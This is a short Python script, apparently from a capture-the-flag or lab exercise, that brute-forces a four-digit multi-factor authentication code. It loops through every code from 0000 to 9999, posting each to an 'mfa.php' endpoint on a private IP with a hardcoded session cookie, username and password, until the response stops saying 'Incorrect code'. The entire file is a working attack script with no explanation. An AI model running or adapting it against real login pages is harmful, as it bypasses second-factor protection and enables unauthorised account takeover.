import requests

s = requests.Session()

cookies= {'PHPSESSID':'r2cp3f0qa7a9puquiqoh34fs8h', 'user':'jason_test_account', 'pwd':'chunky%21%21'}
s.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})

for i in range(0000,10000):
        a = '{:d}'.format(i).zfill(4)
        print(a,end='\r')
        r = s.post('http://10.10.219.209/console/mfa.php',cookies=cookies,data='code={}'.format(a))
        if 'Incorrect code' not in r.text:
                #print(r.text)
                print('[+] Found the code: {}'.format(a))
                break
